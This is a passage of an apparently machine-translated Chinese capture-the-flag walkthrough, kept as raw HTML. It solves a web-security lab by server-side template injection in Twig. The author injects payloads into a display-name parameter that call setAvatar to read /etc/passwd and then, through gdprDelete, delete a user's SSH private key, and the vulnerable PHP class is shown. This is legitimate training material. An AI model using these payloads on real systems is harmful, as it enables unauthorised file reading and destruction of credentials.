class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">您可以使用以下凭证登录您自己的帐户:<code class="fe mt mu mv mw b">wiener:peter</code></p><p id="97ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">UFF！因此，我们这项任务的挑战是编写一个自定义漏洞，从Carlos的目录中删除<code class="fe mt mu mv mw b">/.shh/id_rsa</code>文件。</p><p id="7ae7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们从识别易受SSTI注射影响的终点的第一步开始。</p><p id="d215" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在分析了网络一分钟后，我注意到的一件事是上传功能，除此之外，一切都是一样的。让我们发表一个评论，并更改首选名称功能，以包括我们的有效负载。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pc"><img src="../Images/0951e1bd58bed99f5ee3d29de63e1cc7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7wrFS0KW5IVRYoyIcWgu1g.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">首选名称</figcaption></figure><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="d15e" class="nc lr iq mw b gy nd ne l nf ng">blog-post-author-display=user.nickname}}{{7*7</span></pre><p id="52ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们包含了有效载荷，现在可以发送请求了。现在刷新你发表评论的页面。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pd"><img src="../Images/cc46cb35a7cdec95d64bcc0233100ee8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mlnCyNvVWI9XRVOnjnnadw.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">有效负载已执行</figcaption></figure><p id="89d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在开始第2步:识别模板引擎。</p><p id="2612" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在可以监控模板引擎的行为来识别它。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/c4cf8d967e3203f128f4c4db1ceb30d0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*RD558hyrp5artqvOfK4Yvw.png"/></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">哈克特里克斯</figcaption></figure><div class="nk nl gp gr nm nn"><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php" rel="noopener  ugc nofollow" target="_blank"><div class="no ab fo"><div class="np ab nq cl cj nr"><h2 class="bd ir gy z fp ns fr fs nt fu fw ip bi translated">SSTI(服务器端模板注入)</h2><div class="nu l"><h3 class="bd b gy z fp ns fr fs nt fu fw dk translated">模板引擎被设计成通过将固定模板与易变数据相结合来生成网页。服务器端…</h3></div><div class="nv l"><p class="bd b dl z fp ns fr fs nt fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="nw l"><div class="pf l ny nz oa nw ob lk nn"/></div></div></a></div><p id="0a1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们的网站对这些有效负载的行为完全相同，所以我们可以说我们的目标正在使用twig。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pg"><img src="../Images/46a6e3c8919f057a147d2165bcc611c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4-VFOZrqLPFQn1c7QIbZbg.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">嫩枝</figcaption></figure><p id="ba6a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，我们知道我们有上传头像的功能，它应该有一定的用途，所以让我们也检查一下。</p><p id="61de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为了检查它，我们可以尝试上传一个无效的图像。</p><p id="b6a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们点击了一个错误信息</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi ph"><img src="../Images/adc373fc9b8cd52e950c3c48c914a7cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7cqrseJgEi3xrFlEhqSPwg.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">错误</figcaption></figure><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="866a" class="nc lr iq mw b gy nd ne l nf ng">PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/vnd.openxmlformats-officedocument.presentationml.presentation in /home/carlos/User.php:28<br/>Stack trace:<br/>#0 /home/carlos/avatar_upload.php(19): User-&gt;setAvatar('/tmp/DRUG LICEN...', 'application/vnd...')<br/>#1 {main}<br/>  thrown in /home/carlos/User.php on line 28</span></pre><p id="69cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以在一条错误消息中看到，我们有另一个与名为setAvatar()的用户相关联的方法。我们还可以看到它在第一个参数中加载一个文件，在第二个参数中获取它的mime类型，也许我们可以在第一个参数中加载<code class="fe mt mu mv mw b">/etc/passwd</code>文件。</p><p id="96ea" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们在改名请求上试试。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pi"><img src="../Images/84973f4e4251abd291c66dde39a3dc4d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*shWbeSRSsWC_maGZQRscsw.png"/></div></div></figure><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="770f" class="nc lr iq mw b gy nd ne l nf ng">blog-post-author-display=user.setAvatar('/etc/passwd')</span></pre><p id="eef1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在后端，它可以被执行为</p><p id="3814" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">blog-post-author-display = { { user . set avatar('/etc/passwd ')} }</p><p id="84d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">只需发送请求并重新加载页面。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pj"><img src="../Images/cb320e3dc66ce738d4b8b8f84e32c016.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vyvmIao2bFzaKOZnUlJDzQ.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">错误</figcaption></figure><p id="39df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到它导致了一个错误。</p><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="f618" class="nc lr iq mw b gy nd ne l nf ng">PHP Fatal error: Uncaught ArgumentCountError: Too few arguments to function User::setAvatar(), 1 passed in /usr/local/envs/php-twig-</span></pre><p id="eb7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的函数setAvatar(file，mime-type)有2个参数，我们只传递了一个。</p><p id="05e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们传递另一个mime类型。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pk"><img src="../Images/bf639a7c2203504b7f833eca79cad446.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JBRT6zzrvw6wJAiXaMVpqQ.png"/></div></div></figure><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="e61c" class="nc lr iq mw b gy nd ne l nf ng">blog-post-author-display=user.setAvatar('/etc/passwd','image/jpg')</span></pre><p id="062d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在发送请求。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pl"><img src="../Images/d78f351acbb896879aa8b929349271f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Gw3y7LqOBEnXGdNGQjyRTA.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">标准载荷</figcaption></figure><p id="f0f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到我们的页面加载正常，我们有一个图像类型，让我们在一个新的标签打开它。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pm"><img src="../Images/056b7cc2f3496723aeecd41005eca2b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*FwI8lx40xWTss_VWXkM6ag.png"/></div></div><figcaption class="lm ln gj gh gi lo lp bd b be z dk translated">下载一个文件</figcaption></figure><p id="9b1a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">用记事本打开。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pn"><img src="../Images/a2ff106a3b89b7a3a68b4054631b6fd2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_iXHrIzfM0Iu6rdxkZ7srg.png"/></div></div></figure><p id="6db5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们有/etc/passwd。</p><p id="a921" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们只需要想办法删除头像的图像。</p><p id="c242" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在错误消息中看到有一个user.php。</p><p id="0e06" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们打开它。</p><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="10cf" class="nc lr iq mw b gy nd ne l nf ng">public $user_dir;</span><span id="ab36" class="nc lr iq mw b gy po ne l nf ng">public function __construct($username, $name, $first_name, $nickname) {<br/>        $this-&gt;username = $username;<br/>        $this-&gt;name = $name;<br/>        $this-&gt;first_name = $first_name;<br/>        $this-&gt;nickname = $nickname;<br/>        $this-&gt;user_dir = "users/" . $this-&gt;username;<br/>        $this-&gt;avatarLink = $this-&gt;user_dir . "/avatar";</span><span id="ca84" class="nc lr iq mw b gy po ne l nf ng">if (!file_exists($this-&gt;user_dir)) {<br/>            if (!mkdir($this-&gt;user_dir, 0755, true))<br/>            {<br/>                throw new Exception("Could not mkdir users/" . $this-&gt;username);<br/>            }<br/>        }<br/>    }</span><span id="6bf8" class="nc lr iq mw b gy po ne l nf ng">public function setAvatar($filename, $mimetype) {<br/>        if (strpos($mimetype, "image/") !== 0) {<br/>            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);<br/>        }</span><span id="64c5" class="nc lr iq mw b gy po ne l nf ng">if (is_link($this-&gt;avatarLink)) {<br/>            $this-&gt;rm($this-&gt;avatarLink);<br/>        }</span><span id="24ec" class="nc lr iq mw b gy po ne l nf ng">if (!symlink($filename, $this-&gt;avatarLink)) {<br/>            throw new Exception("Failed to write symlink " . $filename . " -&gt; " . $this-&gt;avatarLink);<br/>        }<br/>    }</span><span id="6e67" class="nc lr iq mw b gy po ne l nf ng">public function delete() {<br/>        $file = $this-&gt;user_dir . "/disabled";<br/>        if (file_put_contents($file, "") === false) {<br/>            throw new Exception("Could not write to " . $file);<br/>        }<br/>    }</span><span id="cd94" class="nc lr iq mw b gy po ne l nf ng"><strong class="mw ir">public function gdprDelete() {<br/>        $this-&gt;rm(readlink($this-&gt;avatarLink));<br/>        $this-&gt;rm($this-&gt;avatarLink);<br/>        $this-&gt;delete();<br/>    }</strong></span><span id="14dc" class="nc lr iq mw b gy po ne l nf ng">private function rm($filename) {<br/>        if (!unlink($filename)) {<br/>            throw new Exception("Could not delete " . $filename);<br/>        }<br/>    }<br/>}</span><span id="c96b" class="nc lr iq mw b gy po ne l nf ng">?&gt;</span></pre><p id="8056" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以看到gdpr函数删除了头像。现在让我们尝试删除id_rsa。</p><p id="d0c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先将头像设置为</p><pre class="lb lc ld le gt my mw mz na aw nb bi"><span id="7032" class="nc lr iq mw b gy nd ne l nf ng">/home/carlos/.ssh/id_rsa</span></pre><p id="03c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在发送请求，调用gdprDelete()方法并重新加载页面。</p><figure class="lb lc ld le gt lf gh gi paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gh gi pp"><img src="../Images/c2ffeed92f821bb80b4a8b19b6744a8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SzgIDGeaMoq_ZFtRJ_tFPQ.png"/></div></div></figure><p id="e1c3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在重新加载页面。我们实验室应该解决了。</p><p id="8303" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我强烈建议你通读我提供的文章。它真的会拓宽你的理解。</p><p id="50b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请跟随我进行更多类似的演练。</p><p id="2ece" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">直到下一次。黑客快乐！</p><figure class="lb lc ld le gt lf"><div class="bz fp l di"><div class="pq og l"/></div></figure></div><div class="ab cl om on hu oo" role="separator"><span class="op bw bk oq or os"/><span class="op bw bk oq or os"/><span class="op bw bk oq or"/></div><div class="ij ik il im in"><p id="92f4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。 <a class="ae ku" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> <em class="pr">加入我们的每周简讯</em> </strong> </a> <em class="pr">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>